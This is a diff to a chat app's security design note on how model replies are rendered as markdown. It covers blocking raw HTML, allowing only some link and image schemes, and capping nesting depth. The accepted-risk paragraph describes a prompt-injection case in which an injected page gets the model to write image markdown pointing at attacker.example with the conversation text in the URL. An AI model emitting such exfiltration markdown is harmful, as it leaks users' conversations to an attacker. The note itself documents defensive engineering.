@@ -158,7 +158,7 @@ SME-30. The model's replies (assistant `Text` blocks, and the streaming bubble) 
 * No HTML string is ever built and nothing sets `dangerous_inner_html`: raw HTML in a reply (a `<script>`, an `<img onerror>`) shows as literal text.
 * A link becomes an `<a>` only for `http`, `https` and `mailto` (any case); `javascript:`, `data:`, relative and every other destination show their text only. Links open in a new tab with `rel="noopener noreferrer"`.
 * An image loads only from `http`/`https`, lazily and with `referrerpolicy="no-referrer"`; any other source shows its alt text.
-* Quotes and lists nested past `MAX_DEPTH` (16) are flattened, so a hostile reply can't make rendering recurse without bound; code over `MAX_HIGHLIGHT_BYTES` (64 KB) isn't highlighted.
+* Quotes and lists nested past `MAX_DEPTH` (16), and separately emphasis, strong, strikethrough and links nested past it, are flattened, so a hostile reply can't make rendering recurse without bound (thousands of nested `*` used to); code over `MAX_HIGHLIGHT_BYTES` (64 KB) isn't highlighted.
 
 What it doesn't cover (accepted, user's decision 2026-09-27, confirmed 2026-10-03): **an image in a reply is fetched without a click.** A prompt-injected page could get the model to write `![](https://attacker.example/?q=<conversation text>)`, and the browser would send that URL when the reply renders. `no-referrer` keeps the page's own address out of the request; the URL itself still leaves. Links aren't followed until clicked.
 
